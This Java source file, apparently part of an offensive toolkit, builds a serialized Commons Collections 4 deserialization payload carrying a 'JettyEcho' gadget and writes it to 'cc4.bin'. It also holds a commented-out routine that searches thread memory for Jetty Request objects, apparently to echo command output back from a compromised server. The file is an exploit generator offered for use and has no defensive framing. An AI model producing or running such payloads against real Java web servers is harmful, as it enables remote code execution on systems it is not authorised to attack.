package org.example.jetty.utils;


import org.example.jetty.gadget.JettyEcho;
import org.ppp.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception {
        cc4();
    }

    public static void cc4() throws Exception {
        Class msmClass = JettyEcho.class;
        CC4Generator cc4Generator = new CC4Generator();
        String payload = cc4Generator.make(msmClass);
        System.out.println(payload.length());
        cc4Generator.makeFile(msmClass, "cc4.bin");
    }

//    public void searchJetty() {
//        //设置搜索类型包含Request关键字的对象
//        List<Keyword> keys = new ArrayList<>();
//        keys.add(new Keyword.Builder().setField_type("Request").build());
//        //定义黑名单
//        List<Blacklist> blacklists = new ArrayList<>();
//        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//        //新建一个广度优先搜索Thread.currentThread()的搜索器
//        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(), keys);
//        // 设置黑名单
//        searcher.setBlacklists(blacklists);
//        //打开调试模式,会生成log日志
//        searcher.setIs_debug(true);
//        //挖掘深度为20
//        searcher.setMax_search_depth(20);
//        //设置报告保存位置
//        searcher.setReport_save_path("/tmp/");
//        searcher.searchObject();
//    }
}
